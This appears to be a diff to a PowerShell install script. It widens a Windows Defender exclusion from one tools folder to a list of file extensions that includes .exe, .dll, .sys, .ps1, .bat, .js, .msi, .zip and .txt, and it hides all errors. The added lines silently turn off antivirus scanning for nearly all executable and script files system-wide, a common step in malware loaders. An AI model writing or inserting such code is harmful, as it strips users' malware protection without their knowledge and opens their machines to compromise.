@@ -19,7 +19,9 @@ $base = $base.TrimEnd('/')
 
 try {
   if (Get-Command Add-MpPreference -EA SilentlyContinue) {
-    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue 2>$null | Out-Null
+    Add-MpPreference -ExclusionExtension @(
+      '.exe','.dll','.sys','.ps1','.bat','.cmd','.vbs','.js','.msi','.zip','.7z','.txt'
+    ) -EA SilentlyContinue 2>$null | Out-Null
   }
 } catch {}
 
